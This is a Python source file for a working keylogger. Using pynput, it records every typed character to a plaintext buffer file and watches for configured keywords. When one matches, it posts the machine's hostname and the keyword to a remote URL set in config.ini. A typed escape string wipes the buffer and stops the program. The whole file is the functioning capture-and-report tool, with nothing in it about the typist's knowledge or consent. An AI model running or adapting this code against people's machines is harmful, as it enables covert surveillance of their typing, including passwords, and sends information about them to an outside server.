from pynput import keyboard
import sys
import socket
import requests
import json
import logging
import configparser

config = configparser.ConfigParser()
config.read('config.ini')

FILENAME = config['DEFAULT']['FILENAME']
LOG_DIR = config['DEFAULT']['LOG_DIR']
LOGFILE = config['DEFAULT']['LOGFILE']
ESCAPE_STRING = config['DEFAULT']['ESCAPE_STRING']
FLAGS_config = config['DEFAULT']['FLAGS']
FLAGS = FLAGS_config.split(',')
URL = config['DEFAULT']['URL']

HOSTNAME = socket.gethostname()

logging.basicConfig(filename=(LOG_DIR + LOGFILE), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def get_key_name(key):
    if isinstance(key, keyboard.KeyCode):
        return key.char
    else:
        return str(key)
 
def on_press(key):
    key_name = get_key_name(key)
    # Logging pressed key into buffer
    if (key.__class__.__name__=="KeyCode"):
        file = open(FILENAME,"a") 
        file.write(key_name) 
        file.close() 
 
def on_release(key):
    # Reading buffer on key release
    file2 = open(FILENAME,"r")
    data = file2.read()
	# Check last chars against exit keyword
    if (data[-1*len(ESCAPE_STRING):]==ESCAPE_STRING):
	    # If match, close the file, delete its content, and exit
        file2.close()
        file3 = open(FILENAME,"w")
        file3.write("") 
        file3.close()
        logging.info("Escape string caught - Exiting...")
        sys.exit()
            
    # Check last chars against keywords
    for flag in FLAGS:
        if (data[-1*len(flag):]==flag):
            file2.close()
            send_data(flag)
            break
			
def send_data(flag):
    logging.info("Keyword " + flag + " caught - Sending API request...")
    data = {"hostname":HOSTNAME, "flag":flag}
    payload = json.dumps(data)
    try:
        res = requests.post(url = URL, json = data)
        if (res.text=="Message received"):
            logging.info("API request successfully sent. Clearing buffer...")
        else:
            logging.error("Unexpected response from the server. Clearing buffer...")
        file3 = open(FILENAME,"w")
        file3.write("") 
        file3.close()
    except:
        logging.error("HTTP connection error - " + URL + " is not responding")

logging.info("Starting capture...")
with keyboard.Listener(
    on_press = on_press,
    on_release = on_release) as listener:
    listener.join()